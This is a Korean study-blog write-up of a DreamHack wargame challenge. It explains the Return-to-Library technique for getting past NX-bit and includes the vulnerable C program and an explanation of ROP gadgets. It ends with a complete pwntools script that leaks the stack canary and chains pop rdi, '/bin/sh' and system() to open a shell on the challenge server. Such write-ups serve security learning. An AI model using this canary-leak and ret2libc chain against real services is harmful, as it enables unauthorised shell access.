---
title: "[PWNABLE] RTL"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ # 시험기간이 있었던 바람에 최근 포스팅한 게시글 중 일부 예제를 직접 만들지는 못했습니다. # 다음 실습부터 다시 직접 예제를 만들며 진행하겠습니다. RTL Return to Library는 메모리 보호 기법 중 하나인 NX-bit를 우회하기 위한"
date: "2023-10-22"
translation_key: "tistory-fb026a46c243"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-RTL"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.** **※** 

**\# 시험기간이 있었던 바람에 최근 포스팅한 게시글 중 일부 예제를 직접 만들지는 못했습니다.**

**\# 다음 실습부터 다시 직접 예제를 만들며 진행하겠습니다.** 

### RTL

Return to Library는 메모리 보호 기법 중 하나인 NX-bit를 우회하기 위한 공격기법이다.

해당 기법은 DreamHack의 문제를 가지고 진행하겠다.

![](/assets/images/tistory/tistory-fb026a46c243/001.png)

보호기법을 살펴보면 NX-bit가 켜져있는 것을 볼 수 있다.

![](/assets/images/tistory/tistory-fb026a46c243/002.png)

gdb의 vmmap으로 권한을 확인한 모습이다.

NX-bit에 의해 스택에 실행권한이 빠져있는 것을 볼 수 있다. 

때문에 Shellcode 같은 Byte code를 사용하는 것은 불가능에 가깝다.

이를 우회하기 위해서 실행권한이 남아있는 영역 중 하나인 라이브러리의 코드 영역이다.

공유 라이브러리에는 system, execve 같은 셸을 실행시킬 수 있는 함수들이 존재하기 때문에

해당 함수들을 사용하여 /bin/sh를 인자로 사용할 수 있다면 셸을 얻을 수 있다.

```
#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

문제 코드를 보면 canary를 우회할 수 있는 취약점이 존재한다.

그리고 /bin/sh 문자열이 코드에 존재한다.

해당 부분을 이용하면 system의 인자로 사용할 수 있을 것이다.

system함수의 인자는 1개를 필요로 하기 때문에 pop rdi라는 가젯을 이용하고,

system함수로 ret하면 될 것이다.

더보기

#### 가젯이란?

일반적으로 '코드 조각'을 의미한다.

이렇게만 보면 이게 무슨 소리인가 싶을 것이다.

ret 가젯을 예로 설명하겠다.

ret 가젯은 말 그대로 ret 명령을 실행하기 위한 코드 조각이다.

![](/assets/images/tistory/tistory-fb026a46c243/003.png)

위 그림은 main함수의 종료 부분이다.

main함수를 비룻한 함수들은 다시 복귀할 때 ret라는 어셈블리어를 사용한다.

이때 사용되는 ret의 주소인 0x4012ce가 ret 가젯이 될 수 있다.

이렇게 disassemble을 했을 때 pop rdi, rsi, ret 등의 코드들이 있을 것인데

이 부분을 코드 조각 즉 '**가젯**'이라고 한다.

우선, canary 부분에서 다뤘었던 canary leak을 수행한다.

그리고 나서 페이로드를 구성하면 되는데,

pr + binsh + system 순으로 넣어주면 된다.

![](/assets/images/tistory/tistory-fb026a46c243/004.png)

가젯은 pop rdi; ret;인 0x400853을 이용하면 된다.

```
from pwn import*

p = remote('host3.dreamhack.games',19862)
#p = process('./rtl')
e = ELF('./rtl')

#context.log_level='debug'

payload =  b'A'*0x39

p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)

cny = u64(b'\x00'+p.recvn(7))
print("canary : ", hex(cny))

system_add = e.sym['system']
binsh_add = next(e.search(b'/bin/sh'))
p_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b''
payload += b'a'*0x38
payload += p64(cny)
payload += b'a'*0x8
payload += p64(ret)
payload += p64(p_rdi)
payload += p64(binsh_add)
payload += p64(system_add)

p.sendafter(b"Buf: ", payload)

p.interactive()
```
